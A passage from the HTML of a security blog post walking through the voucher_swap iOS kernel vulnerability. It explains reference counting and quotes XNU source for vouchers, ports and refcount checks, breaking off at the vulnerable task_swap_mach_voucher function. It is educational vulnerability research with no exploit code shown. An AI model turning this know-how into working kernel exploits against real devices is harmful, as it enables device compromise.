<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>From zero to tfp0 - Part 2: A Walkthrough of the voucher_swap exploit | Prateekg147</title>
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="From zero to tfp0 - Part 2: A Walkthrough of the voucher_swap exploit" />
<meta name="author" content="Prateek Gianchandani" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="In this article, we will get an in-depth look at the voucher_swap vulnerability and all the steps leading up to getting the kernel task port." />
<meta property="og:description" content="In this article, we will get an in-depth look at the voucher_swap vulnerability and all the steps leading up to getting the kernel task port." />
<meta property="og:site_name" content="Prateekg147" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-06-01T00:40:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="From zero to tfp0 - Part 2: A Walkthrough of the voucher_swap exploit" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Prateek Gianchandani"},"dateModified":"2020-06-01T00:40:00+00:00","datePublished":"2020-06-01T00:40:00+00:00","description":"In this article, we will get an in-depth look at the voucher_swap vulnerability and all the steps leading up to getting the kernel task port.","headline":"From zero to tfp0 - Part 2: A Walkthrough of the voucher_swap exploit","mainEntityOfPage":{"@type":"WebPage","@id":"/2020/06/01/from-zero-to-tfp0-part-2-a-walkthrough-of-the-voucher-swap-exploit.html"},"url":"/2020/06/01/from-zero-to-tfp0-part-2-a-walkthrough-of-the-voucher-swap-exploit.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Prateekg147" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Blogs<b class="command_prompt"></b></a>
    <a class="site-title" rel="author" href="/about">About<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/prateekg147"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-indigo-hover" href="https://www.linkedin.com/in/prateekgianchandani/"><i class="fab fa-linkedin"></i></a>
        
        
        
        <a class="color-yellow-hover" href="https://github.com/prateek147"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">


<img src="
    https://pbs.twimg.com/profile_images/1244561732170899457/SRr3p2iV_400x400.jpg
" class="author-avatar" alt="Avatar" />
<div class="description">I am Prateek Gianchandani. Currently i am working as a Security Researcher in UAE.  I have interests in Exploit Development, Mobile and Browser Security....<a href="/about"> Continue</a>
</div>

</div>


<div class="post">
  <h1 class="post-title">From zero to tfp0 - Part 2: A Walkthrough of the voucher_swap exploit</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/security/">security</a>
      
      <a class="tag" href="/tag/ios/">ios</a>
      
  </div>
  
  <div class="post-date">
    Published on 01 Jun 2020
    
  </div>
  
  <p>In this article, we will get an in-depth look at the <strong>voucher_swap</strong> vulnerability and all the steps leading up to getting the kernel task port.</p>

<p>All credit for the vulnerability and the PoC goes to <a href="https://twitter.com/_bazad">@_bazad</a></p>

<h3 id="reference-counting">Reference Counting</h3>

<p>The bug in this article is a reference counting issue due to <strong>MIG</strong> generated code. But let’s understand first what is reference counting ? Reference counting is a form of simple yet effective memory management. It is basically a way to keep a count of the number of references to an object held by other objects. If an object’s reference count reaches zero, the object will be freed. Creating or Copying an object will increase its reference count by 1, whereas destroying a reference or overwriting the object will decrement its reference count by 1. In systems with limited memory, reference counting can prove more efficient than garbage collection (which happens in cycles and can be time consuming) , because objects can be claimed as soon as their reference count becomes zero, and this improves overall responsiveness of the system.
<!--more--></p>

<p>Reference counting can be put on certain objects, with a field in the object struct denoting the reference count. For e.g, the Mach Ports(<strong>ipc_port_t</strong>) are reference counted objects, with the 32 bit field <strong>io_references</strong> specifying the number of references, and the functions <strong>ip_references</strong> and <strong>ip_release</strong> are used to increase and decrease the reference count on the port. A simple search for <strong>ip_reference</strong> will give many examples of this function being used to manipulate the reference count of ports.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_object</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">603</span><span class="o">:</span> 			<span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_srights</span><span class="o">++</span><span class="p">;</span>
    <span class="mi">604</span><span class="o">:</span> 		<span class="err">}</span>
    <span class="mi">605</span><span class="o">:</span> 		<span class="n">ip_reference</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">606</span><span class="o">:</span> 		<span class="n">ip_unlock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">607</span><span class="o">:</span> 		<span class="k">break</span><span class="p">;</span>
    <span class="mi">608</span><span class="o">:</span> 	    <span class="err">}</span>
    <span class="mi">609</span><span class="o">:</span> 
    <span class="mi">610</span><span class="o">:</span> 	    <span class="k">case</span> <span class="n">MACH_MSG_TYPE_MAKE_SEND</span><span class="p">:</span> <span class="p">{</span>
    <span class="mi">611</span><span class="o">:</span> 		<span class="n">ipc_port_t</span> <span class="n">port</span> <span class="o">=</span> <span class="p">(</span><span class="n">ipc_port_t</span><span class="p">)</span> <span class="n">object</span><span class="p">;</span>
    <span class="mi">612</span><span class="o">:</span> 
    <span class="mi">613</span><span class="o">:</span> 		<span class="n">ip_lock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">614</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="n">ip_active</span><span class="p">(</span><span class="n">port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">615</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">(</span><span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_receiver_name</span> <span class="o">!=</span> <span class="n">MACH_PORT_NULL</span><span class="p">);</span>
    <span class="mi">616</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">((</span><span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_receiver</span> <span class="o">==</span> <span class="n">ipc_space_kernel</span><span class="p">)</span> <span class="o">||</span>
    <span class="mi">617</span><span class="o">:</span>                    <span class="p">(</span><span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_receiver</span><span class="o">-&gt;</span><span class="n">is_node_id</span> <span class="o">!=</span> <span class="n">HOST_LOCAL_NODE</span><span class="p">));</span>
    <span class="mi">618</span><span class="o">:</span> 			<span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_mscount</span><span class="o">++</span><span class="p">;</span>
    <span class="mi">619</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">620</span><span class="o">:</span> 
    <span class="mi">621</span><span class="o">:</span> 		<span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_srights</span><span class="o">++</span><span class="p">;</span>
    <span class="mi">622</span><span class="o">:</span> 		<span class="n">ip_reference</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">623</span><span class="o">:</span> 		<span class="n">ip_unlock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">624</span><span class="o">:</span> 		<span class="k">break</span><span class="p">;</span>
    <span class="mi">625</span><span class="o">:</span> 	    <span class="p">}</span></code></pre></figure>

<p>And same for <strong>vouchers</strong>, the value <strong>iv_refs</strong> keeps a track of the reference count, as can be seen in <strong>osfmk/ipc/ipc_voucher.c</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">63</span><span class="o">:</span> <span class="cm">/*
    64:  * IPC Voucher
    65:  *
    66:  * Vouchers are a reference counted immutable (once-created) set of
    67:  * indexes to particular resource manager attribute values
    68:  * (which themselves are reference counted).
    69:  */</span>
    <span class="mi">70</span><span class="o">:</span> <span class="k">struct</span> <span class="n">ipc_voucher</span> <span class="p">{</span>
    <span class="mi">71</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_hash</span><span class="p">;</span>	<span class="cm">/* checksum hash */</span>
    <span class="mi">72</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_sum</span><span class="p">;</span>		<span class="cm">/* checksum of values */</span>
    <span class="mi">73</span><span class="o">:</span> 	<span class="n">os_refcnt_t</span>		<span class="n">iv_refs</span><span class="p">;</span>	<span class="cm">/* reference count */</span>
    <span class="mi">74</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_table_size</span><span class="p">;</span>	<span class="cm">/* size of the voucher table */</span>
    <span class="mi">75</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_inline_table</span><span class="p">[</span><span class="n">IV_ENTRIES_INLINE</span><span class="p">];</span>
    <span class="mi">76</span><span class="o">:</span> 	<span class="n">iv_entry_t</span>		<span class="n">iv_table</span><span class="p">;</span>	<span class="cm">/* table of voucher attr entries */</span>
    <span class="mi">77</span><span class="o">:</span> 	<span class="n">ipc_port_t</span>		<span class="n">iv_port</span><span class="p">;</span>	<span class="cm">/* port representing the voucher */</span>
    <span class="mi">78</span><span class="o">:</span> 	<span class="n">queue_chain_t</span>		<span class="n">iv_hash_link</span><span class="p">;</span>	<span class="cm">/* link on hash chain */</span>
    <span class="mi">79</span><span class="o">:</span> <span class="p">};</span>
    <span class="mi">80</span><span class="o">:</span> 
    <span class="mi">81</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IV_NULL</span> 	<span class="n">IPC_VOUCHER_NULL</span></code></pre></figure>

<p>The value <strong>iv_refs</strong> is of the type <strong>os_refcnt_t</strong>, which is a 32 bit integer, so its range should be from <strong>0-0xffffffff</strong> right ? Actually not. The maximum value is defined to be <strong>0x0fffffff</strong> (7 f’s) in the file <strong>libkern/os/refcnt.c</strong>. You may wonder why ? This is a new mitigation to protect against integer overflows, and makes the reference leaks vulnerability unexploitable, but still a reference counting leak vulnerability can let you increase the reference count and hence perform interesting things as we will see later in this article.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">libkern</span><span class="o">/</span><span class="n">os</span><span class="o">/</span><span class="n">refcnt</span><span class="p">.</span><span class="n">c</span>
    <span class="mo">05</span><span class="o">:</span> <span class="err">#</span><span class="n">include</span> 
    <span class="mo">06</span><span class="o">:</span> <span class="err">#</span><span class="n">include</span> 
    <span class="mo">07</span><span class="o">:</span> <span class="err">#</span><span class="n">include</span> <span class="s">"refcnt.h"</span>
    <span class="mi">08</span><span class="o">:</span> 
    <span class="mi">09</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="nf">OS_REFCNT_MAX_COUNT</span>     <span class="p">((</span><span class="n">os_ref_count_t</span><span class="p">)</span><span class="mh">0x0FFFFFFFUL</span><span class="p">)</span>
    <span class="mi">10</span><span class="o">:</span> 
    <span class="mi">11</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">OS_REFCNT_DEBUG</span>
    <span class="mi">12</span><span class="o">:</span> <span class="n">os_refgrp_decl</span><span class="p">(</span><span class="k">static</span><span class="p">,</span> <span class="n">global_ref_group</span><span class="p">,</span> <span class="s">"all"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="mi">13</span><span class="o">:</span> <span class="k">static</span> <span class="n">bool</span> <span class="n">ref_debug_enable</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    <span class="mi">14</span><span class="o">:</span> <span class="k">static</span> <span class="k">const</span> <span class="kt">size_t</span> <span class="n">ref_log_nrecords</span> <span class="o">=</span> <span class="mi">1000000</span><span class="p">;</span></code></pre></figure>

<p>Accessing any value out of this range will trigger a kernel panic, as can be seen from the functions below.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">libkern</span><span class="o">/</span><span class="n">os</span><span class="o">/</span><span class="n">refcnt</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">36</span><span class="o">:</span> <span class="k">static</span> <span class="kt">void</span>
    <span class="mi">37</span><span class="o">:</span> <span class="n">os_ref_check_underflow</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">,</span> <span class="n">os_ref_count_t</span> <span class="n">count</span><span class="p">)</span>
    <span class="mi">38</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">39</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">__improbable</span><span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">40</span><span class="o">:</span> 		<span class="n">panic</span><span class="p">(</span><span class="s">"os_refcnt: underflow (rc=%p, grp=%s)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">rc</span><span class="p">,</span> <span class="n">ref_grp_name</span><span class="p">(</span><span class="n">rc</span><span class="p">));</span>
    <span class="mi">41</span><span class="o">:</span> 		<span class="n">__builtin_unreachable</span><span class="p">();</span>
    <span class="mi">42</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">43</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">44</span><span class="o">:</span> 
    <span class="mi">45</span><span class="o">:</span> <span class="k">static</span> <span class="kt">void</span>
    <span class="mi">46</span><span class="o">:</span> <span class="n">os_ref_assert_referenced</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">,</span> <span class="n">os_ref_count_t</span> <span class="n">count</span><span class="p">)</span>
    <span class="mi">47</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">48</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">__improbable</span><span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">49</span><span class="o">:</span> 		<span class="n">panic</span><span class="p">(</span><span class="s">"os_refcnt: used unsafely when zero (rc=%p, grp=%s)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">rc</span><span class="p">,</span> <span class="n">ref_grp_name</span><span class="p">(</span><span class="n">rc</span><span class="p">));</span>
    <span class="mi">50</span><span class="o">:</span> 		<span class="n">__builtin_unreachable</span><span class="p">();</span>
    <span class="mi">51</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">52</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">53</span><span class="o">:</span> 
    <span class="mi">54</span><span class="o">:</span> <span class="k">static</span> <span class="kt">void</span>
    <span class="mi">55</span><span class="o">:</span> <span class="n">os_ref_check_overflow</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">,</span> <span class="n">os_ref_count_t</span> <span class="n">count</span><span class="p">)</span>
    <span class="mi">56</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">57</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">__improbable</span><span class="p">(</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="n">OS_REFCNT_MAX_COUNT</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">58</span><span class="o">:</span> 		<span class="n">panic</span><span class="p">(</span><span class="s">"os_refcnt: overflow (rc=%p, grp=%s)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">rc</span><span class="p">,</span> <span class="n">ref_grp_name</span><span class="p">(</span><span class="n">rc</span><span class="p">));</span>
    <span class="mi">59</span><span class="o">:</span> 		<span class="n">__builtin_unreachable</span><span class="p">();</span>
    <span class="mi">60</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">61</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<p>The <strong>ipc_voucher_release</strong> and <strong>ipc_voucher_reference</strong> functions for a voucher just check whether the voucher is not <strong>NULL</strong> and call <strong>iv_reference</strong> and <strong>iv_release</strong> which then calls <strong>os_ref_retain</strong> and <strong>os_ref_release</strong> respectively.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">449</span><span class="o">:</span> <span class="kt">void</span>
    <span class="mi">450</span><span class="o">:</span> <span class="n">ipc_voucher_reference</span><span class="p">(</span><span class="n">ipc_voucher_t</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">451</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">452</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IPC_VOUCHER_NULL</span> <span class="o">==</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">453</span><span class="o">:</span> 		<span class="k">return</span><span class="p">;</span>
    <span class="mi">454</span><span class="o">:</span> 
    <span class="mi">455</span><span class="o">:</span> 	<span class="n">iv_reference</span><span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">456</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">457</span><span class="o">:</span> 
    <span class="mi">458</span><span class="o">:</span> <span class="kt">void</span>
    <span class="mi">459</span><span class="o">:</span> <span class="n">ipc_voucher_release</span><span class="p">(</span><span class="n">ipc_voucher_t</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">460</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">461</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IPC_VOUCHER_NULL</span> <span class="o">!=</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">462</span><span class="o">:</span> 		<span class="n">iv_release</span><span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">463</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">104</span><span class="o">:</span> 
    <span class="mi">105</span><span class="o">:</span> <span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span>
    <span class="mi">106</span><span class="o">:</span> <span class="n">iv_reference</span><span class="p">(</span><span class="n">ipc_voucher_t</span> <span class="n">iv</span><span class="p">)</span>
    <span class="mi">107</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">108</span><span class="o">:</span> 	<span class="n">os_ref_retain</span><span class="p">(</span><span class="o">&amp;</span><span class="n">iv</span><span class="o">-&gt;</span><span class="n">iv_refs</span><span class="p">);</span>
    <span class="mi">109</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">110</span><span class="o">:</span> 
    <span class="mi">111</span><span class="o">:</span> <span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span>
    <span class="mi">112</span><span class="o">:</span> <span class="n">iv_release</span><span class="p">(</span><span class="n">ipc_voucher_t</span> <span class="n">iv</span><span class="p">)</span>
    <span class="mi">113</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">114</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">os_ref_release</span><span class="p">(</span><span class="o">&amp;</span><span class="n">iv</span><span class="o">-&gt;</span><span class="n">iv_refs</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">115</span><span class="o">:</span> 		<span class="n">iv_dealloc</span><span class="p">(</span><span class="n">iv</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">);</span>
    <span class="mi">116</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">117</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<p>More details can be found under <strong>BUILD/obj/EXPORT_HDRS/libkern/os/refcnt.h</strong></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">libkern</span><span class="o">/</span><span class="n">os</span><span class="o">/</span><span class="n">refcnt</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">126</span><span class="o">:</span> <span class="cm">/*
    127:  * os_ref_retain: acquire a reference (increment reference count by 1) atomically.
    128:  *
    129:  * os_ref_release: release a reference (decrement reference count) atomically and
    130:  *		return the new count. Memory is synchronized such that the dealloc block
    131:  *		(i.e. code handling the final release() == 0 call) sees up-to-date memory
    132:  *		with respect to all prior release()s on the same refcnt object. This
    133:  *		memory ordering is sufficient for most use cases.
    134:  *
    135:  * os_ref_release_relaxed: same as release() but with weaker relaxed memory ordering.
    136:  *		This can be used when the dealloc block is already synchronized with other
    137:  *		accesses to the object (for example, with a lock).
    138:  *
    139:  * os_ref_release_live: release a reference that is guaranteed not to be the last one.
    140:  */</span>
    <span class="mi">141</span><span class="o">:</span> <span class="kt">void</span> <span class="nf">os_ref_retain</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="p">);</span>
    <span class="mi">142</span><span class="o">:</span> 
    <span class="mi">143</span><span class="o">:</span> <span class="n">os_ref_count_t</span> <span class="n">os_ref_release_explicit</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">,</span>
    <span class="mi">144</span><span class="o">:</span> 		<span class="n">memory_order</span> <span class="n">release_order</span><span class="p">,</span> <span class="n">memory_order</span> <span class="n">dealloc_order</span><span class="p">)</span> <span class="n">OS_WARN_RESULT</span><span class="p">;</span>
    <span class="mi">145</span><span class="o">:</span> 
    <span class="mi">146</span><span class="o">:</span> <span class="k">static</span> <span class="kr">inline</span> <span class="n">os_ref_count_t</span> <span class="n">OS_WARN_RESULT</span>
    <span class="mi">147</span><span class="o">:</span> <span class="n">os_ref_release</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">)</span>
    <span class="mi">148</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">149</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">os_ref_release_explicit</span><span class="p">(</span><span class="n">rc</span><span class="p">,</span> <span class="n">memory_order_release</span><span class="p">,</span> <span class="n">memory_order_acquire</span><span class="p">);</span>
    <span class="mi">150</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">151</span><span class="o">:</span> 
    <span class="mi">152</span><span class="o">:</span> <span class="k">static</span> <span class="kr">inline</span> <span class="n">os_ref_count_t</span> <span class="n">OS_WARN_RESULT</span>
    <span class="mi">153</span><span class="o">:</span> <span class="n">os_ref_release_relaxed</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">)</span>
    <span class="mi">154</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">155</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">os_ref_release_explicit</span><span class="p">(</span><span class="n">rc</span><span class="p">,</span> <span class="n">memory_order_relaxed</span><span class="p">,</span> <span class="n">memory_order_relaxed</span><span class="p">);</span>
    <span class="mi">156</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">157</span><span class="o">:</span> 
    <span class="mi">158</span><span class="o">:</span> <span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span>
    <span class="mi">159</span><span class="o">:</span> <span class="n">os_ref_release_live</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">)</span>
    <span class="mi">160</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">161</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">__improbable</span><span class="p">(</span><span class="n">os_ref_release_explicit</span><span class="p">(</span><span class="n">rc</span><span class="p">,</span>
    <span class="mi">162</span><span class="o">:</span> 			<span class="n">memory_order_release</span><span class="p">,</span> <span class="n">memory_order_relaxed</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">163</span><span class="o">:</span> 		<span class="n">panic</span><span class="p">(</span><span class="s">"os_refcnt: unexpected release of final reference (rc=%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
    <span class="mi">164</span><span class="o">:</span> 		<span class="n">__builtin_unreachable</span><span class="p">();</span>
    <span class="mi">165</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">166</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">167</span><span class="o">:</span> </code></pre></figure>

<p>There can be two kinds of vulnerabilities that can arise because of this, one is if the reference count can be increased in some way such that it leads to an overflow. We already discussed that because of the maximum cap, this is not really exploitable. However, you can still increase the ref count up to <strong>0x0fffffff</strong> and we will use this technique later. The other is lets say the object’s reference count can be set to 0 but there is still a pointer to it. Now, since the reference count becomes 0 the object will be freed, and hence the pointer pointing to it becomes what we call a <strong>dangling pointer</strong>.</p>

<h3 id="the-vulnerability">The Vulnerability</h3>

<p>So let’s have a look at the vulnerability. Look under the file <strong>/xnu-4903.221.2/osfmk/kern/task.c</strong> and the function <strong>task_swap_mach_voucher</strong>. This is a simple function that is supposed to take a new voucher and an old voucher and swap them. Well, this is what it is suppossed to do but it just removes the <strong>old_voucher</strong> with the <strong>new_voucher</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="n">task</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">5993</span><span class="o">:</span> <span class="cm">/* Placeholders for the task set/get voucher interfaces */</span>
    <span class="mi">5994</span><span class="o">:</span> <span class="n">kern_return_t</span> 
    <span class="mi">5995</span><span class="o">:</span> <span class="n">task_get_mach_voucher</span><span class="p">(</span>
    <span class="mi">5996</span><span class="o">:</span> 	<span class="n">task_t</span>			<span class="n">task</span><span class="p">,</span>
    <span class="mi">5997</span><span class="o">:</span> 	<span class="n">mach_voucher_selector_t</span> <span class="n">__unused</span> <span class="n">which</span><span class="p">,</span>
    <span class="mi">5998</span><span class="o">:</span> 	<span class="n">ipc_voucher_t</span>		<span class="o">*</span><span class="n">voucher</span><span class="p">)</span>
    <span class="mi">5999</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">6000</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">TASK_NULL</span> <span class="o">==</span> <span class="n">task</span><span class="p">)</span>
    <span class="mi">6001</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_INVALID_TASK</span><span class="p">;</span>
    <span class="mi">6002</span><span class="o">:</span> 
    <span class="mi">6003</span><span class="o">:</span> 	<span class="o">*</span><span class="n">voucher</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="mi">6004</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">6005</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">6006</span><span class="o">:</span> 
    <span class="mi">6007</span><span class="o">:</span> <span class="n">kern_return_t</span> 
    <span class="mi">6008</span><span class="o">:</span> <span class="n">task_set_mach_voucher</span><span class="p">(</span>
    <span class="mi">6009</span><span class="o">:</span> 	<span class="n">task_t</span>			<span class="n">task</span><span class="p">,</span>
    <span class="mi">6010</span><span class="o">:</span> 	<span class="n">ipc_voucher_t</span>		<span class="n">__unused</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">6011</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">6012</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">TASK_NULL</span> <span class="o">==</span> <span class="n">task</span><span class="p">)</span>
    <span class="mi">6013</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_INVALID_TASK</span><span class="p">;</span>
    <span class="mi">6014</span><span class="o">:</span> 
    <span class="mi">6015</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">6016</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">6017</span><span class="o">:</span> 
    <span class="mi">6018</span><span class="o">:</span> <span class="n">kern_return_t</span>
    <span class="mi">6019</span><span class="o">:</span> <span class="n">task_swap_mach_voucher</span><span class="p">(</span>
    <span class="mi">6020</span><span class="o">:</span> 	<span class="n">task_t</span>			<span class="n">task</span><span class="p">,</span>
    <span class="mi">6021</span><span class="o">:</span> 	<span class="n">ipc_voucher_t</span>		<span class="n">new_voucher</span><span class="p">,</span>
